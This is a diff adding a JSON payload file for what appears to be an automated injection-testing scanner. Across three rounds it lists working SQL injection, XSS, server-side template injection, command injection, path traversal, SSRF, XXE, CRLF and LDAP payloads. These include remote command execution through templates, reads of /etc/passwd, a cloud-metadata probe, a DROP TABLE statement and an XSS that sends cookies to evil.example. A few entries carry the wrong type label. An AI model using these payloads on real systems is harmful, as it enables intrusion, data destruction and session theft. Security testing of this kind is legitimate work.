@@ -1,0 +1,481 @@
+{
+  "schema_version": 1,
+  "skill": "test_injection",
+  "description": "SQLi/XSS/SSTI/CMDi payloads with round rotation. Round 1=classic, 2=blind+time, 3=WAF bypass+polyglot.",
+  "rounds": {
+    "1": [
+      {
+        "type": "sqli",
+        "payload": "'",
+        "detect": [
+          "sql",
+          "sqlite",
+          "mysql",
+          "postgres",
+          "syntax error",
+          "ORA-",
+          "unclosed quotation"
+        ]
+      },
+      {
+        "type": "sqli",
+        "payload": "' OR 1=1--",
+        "detect": [
+          "sql"
+        ]
+      },
+      {
+        "type": "sqli",
+        "payload": "1' ORDER BY 100--",
+        "detect": [
+          "sql",
+          "order"
+        ]
+      },
+      {
+        "type": "sqli",
+        "payload": "' UNION SELECT NULL--",
+        "detect": [
+          "sql"
+        ]
+      },
+      {
+        "type": "sqli",
+        "payload": "1; DROP TABLE test--",
+        "detect": [
+          "sql"
+        ]
+      },
+      {
+        "type": "sqli",
+        "payload": "' AND 1=CONVERT(int,(SELECT @@version))--",
+        "detect": [
+          "convert",
+          "sql"
+        ]
+      },
+      {
+        "type": "sqli",
+        "payload": "' AND (SELECT * FROM (SELECT(SLEEP(2)))a)--",
+        "detect": []
+      },
+      {
+        "type": "sqli_blind",
+        "payload": "' AND '1'='1",
+        "detect": []
+      },
+      {
+        "type": "sqli_blind",
+        "payload": "' AND '1'='2",
+        "detect": []
+      },
+      {
+        "type": "xss",
+        "payload": "<script>alert(1)</script>",
+        "detect": [
+          "<script>alert(1)</script>"
+        ]
+      },
+      {
+        "type": "xss",
+        "payload": "<img src=x onerror=alert(1)>",
+        "detect": [
+          "onerror=alert"
+        ]
+      },
+      {
+        "type": "xss",
+        "payload": "<iframe src=javascript:alert(1)>",
+        "detect": [
+          "<iframe"
+        ]
+      },
+      {
+        "type": "xss",
+        "payload": "\"><script>alert(1)</script>",
+        "detect": [
+          "<script>"
+        ]
+      },
+      {
+        "type": "xss",
+        "payload": "'-alert(1)-'",
+        "detect": [
+          "alert(1)"
+        ]
+      },
+      {
+        "type": "xss",
+        "payload": "<svg onload=alert(1)>",
+        "detect": [
+          "<svg"
+        ]
+      },
+      {
+        "type": "xss",
+        "payload": "{{7*7}}",
+        "detect": [
+          "49"
+        ]
+      },
+      {
+        "type": "ssti",
+        "payload": "${7*7}",
+        "detect": [
+          "49"
+        ]
+      },
+      {
+        "type": "ssti",
+        "payload": "{{config}}",
+        "detect": [
+          "SECRET_KEY",
+          "config"
+        ]
+      },
+      {
+        "type": "ssti",
+        "payload": "<%= 7*7 %>",
+        "detect": [
+          "49"
+        ]
+      },
+      {
+        "type": "ssti",
+        "payload": "{%import os%}{{os.popen('id').read()}}",
+        "detect": [
+          "uid="
+        ]
+      },
+      {
+        "type": "cmdi",
+        "payload": ";id",
+        "detect": [
+          "uid="
+        ]
+      },
+      {
+        "type": "cmdi",
+        "payload": "|id",
+        "detect": [
+          "uid="
+        ]
+      },
+      {
+        "type": "cmdi",
+        "payload": "`id`",
+        "detect": [
+          "uid="
+        ]
+      },
+      {
+        "type": "cmdi",
+        "payload": "$(id)",
+        "detect": [
+          "uid="
+        ]
+      },
+      {
+        "type": "cmdi",
+        "payload": ";cat /etc/passwd",
+        "detect": [
+          "root:"
+        ]
+      },
+      {
+        "type": "path_traversal",
+        "payload": "../../etc/passwd",
+        "detect": [
+          "root:"
+        ]
+      },
+      {
+        "type": "path_traversal",
+        "payload": "....//....//etc/passwd",
+        "detect": [
+          "root:"
+        ]
+      },
+      {
+        "type": "path_traversal",
+        "payload": "%2e%2e%2f%2e%2e%2fetc/passwd",
+        "detect": [
+          "root:"
+        ]
+      },
+      {
+        "type": "ssrf",
+        "payload": "http://localhost/",
+        "detect": []
+      },
+      {
+        "type": "ssrf",
+        "payload": "http://169.254.169.254/latest/meta-data/",
+        "detect": [
+          "ami-",
+          "instance"
+        ]
+      },
+      {
+        "type": "nosql",
+        "payload": "{'$ne': null}",
+        "detect": []
+      },
+      {
+        "type": "nosql",
+        "payload": "[$ne]=1",
+        "detect": []
+      }
+    ],
+    "2": [
+      {
+        "type": "sqli_time",
+        "payload": "' AND SLEEP(3)--",
+        "detect": []
+      },
+      {
+        "type": "sqli_time",
+        "payload": "'; WAITFOR DELAY '0:0:3'--",
+        "detect": []
+      },
+      {
+        "type": "sqli_time",
+        "payload": "' OR pg_sleep(3)--",
+        "detect": []
+      },
+      {
+        "type": "sqli_time",
+        "payload": "';select pg_sleep(3)--",
+        "detect": []
+      },
+      {
+        "type": "sqli",
+        "payload": "1); SELECT version()--",
+        "detect": [
+          "postgres",
+          "mysql",
+          "mariadb"
+        ]
+      },
+      {
+        "type": "sqli",
+        "payload": "' UNION SELECT 1,@@version,3--",
+        "detect": [
+          "mariadb",
+          "mysql"
+        ]
+      },
+      {
+        "type": "sqli",
+        "payload": "' UNION SELECT table_name FROM information_schema.tables--",
+        "detect": [
+          "information_schema"
+        ]
+      },
+      {
+        "type": "sqli_oob",
+        "payload": "' AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT @@hostname),'.test.invalid\\\\a'))--",
+        "detect": []
+      },
+      {
+        "type": "xss",
+        "payload": "<ScRiPt>alert(1)</sCrIpT>",
+        "detect": [
+          "<scr"
+        ]
+      },
+      {
+        "type": "xss",
+        "payload": "javascript:alert(1)",
+        "detect": [
+          "javascript:alert"
+        ]
+      },
+      {
+        "type": "xss",
+        "payload": "<img/src='x'/onerror=alert(1)>",
+        "detect": [
+          "onerror"
+        ]
+      },
+      {
+        "type": "xss",
+        "payload": "<a href=\"javascript:alert(1)\">x</a>",
+        "detect": [
+          "javascript:"
+        ]
+      },
+      {
+        "type": "xss",
+        "payload": "<body onload=alert(1)>",
+        "detect": [
+          "onload="
+        ]
+      },
+      {
+        "type": "ssti",
+        "payload": "#{7*7}",
+        "detect": [
+          "49"
+        ]
+      },
+      {
+        "type": "ssti",
+        "payload": "*{7*7}",
+        "detect": [
+          "49"
+        ]
+      },
+      {
+        "type": "ssti",
+        "payload": "@(7*7)",
+        "detect": [
+          "49"
+        ]
+      },
+      {
+        "type": "crlf",
+        "payload": "%0d%0aSet-Cookie: injected=1",
+        "detect": []
+      },
+      {
+        "type": "crlf",
+        "payload": "%0aLocation: http://evil.example/",
+        "detect": []
+      },
+      {
+        "type": "xxe",
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY y SYSTEM \"file:///etc/passwd\">]><x>&y;</x>",
+        "detect": [
+          "root:",
+          "bin:"
+        ]
+      },
+      {
+        "type": "ldap",
+        "payload": "*))(|(uid=*",
+        "detect": []
+      },
+      {
+        "type": "ldap",
+        "payload": "admin)(|(password=*))",
+        "detect": []
+      }
+    ],
+    "3": [
+      {
+        "type": "sqli",
+        "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
+        "detect": [
+          "alert()"
+        ]
+      },
+      {
+        "type": "xss",
+        "payload": "'\"><svg onload=alert(String.fromCharCode(88,83,83))>",
+        "detect": [
+          "alert(",
+          "svg"
+        ]
+      },
+      {
+        "type": "sqli",
+        "payload": "%27%20OR%201%3D1--",
+        "detect": [
+          "sql",
+          "error"
+        ]
+      },
+      {
+        "type": "sqli",
+        "payload": "%2527%2520OR%25201%253D1--",
+        "detect": [
+          "sql"
+        ]
+      },
+      {
+        "type": "xss",
+        "payload": "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+        "detect": [
+          "<script>"
+        ]
+      },
+      {
+        "type": "xss",
+        "payload": "<​script>alert(1)</script>",
+        "detect": [
+          "alert"
+        ]
+      },
+      {
+        "type": "sqli",
+        "payload": "'/**/OR/**/1=1--",
+        "detect": [
+          "sql"
+        ]
+      },
+      {
+        "type": "sqli",
+        "payload": "'%0AOR%0A1=1--",
+        "detect": [
+          "sql"
+        ]
+      },
+      {
+        "type": "path_traversal",
+        "payload": "../../etc/passwd%00.jpg",
+        "detect": [
+          "root:"
+        ]
+      },
+      {
+        "type": "path_traversal",
+        "payload": "..;/..;/etc/passwd",
+        "detect": [
+          "root:"
+        ]
+      },
+      {
+        "type": "cmdi",
+        "payload": "$IFS$9id",
+        "detect": [
+          "uid="
+        ]
+      },
+      {
+        "type": "cmdi",
+        "payload": "{id,}",
+        "detect": [
+          "uid="
+        ]
+      },
+      {
+        "type": "cmdi",
+        "payload": "id${IFS}",
+        "detect": [
+          "uid="
+        ]
+      },
+      {
+        "type": "xss",
+        "payload": "\"><img src=x onerror=fetch('//evil.example/?'+document.cookie)>",
+        "detect": [
+          "onerror"
+        ]
+      },
+      {
+        "type": "ssti",
+        "payload": "{{''.__class__.__mro__[2].__subclasses__()}}",
+        "detect": [
+          "subclass",
+          "class"
+        ]
+      },
+      {
+        "type": "ssti",
+        "payload": "${{<%[%'\"}}%\\.",
+        "detect": []
+      }
+    ]
+  }
+}
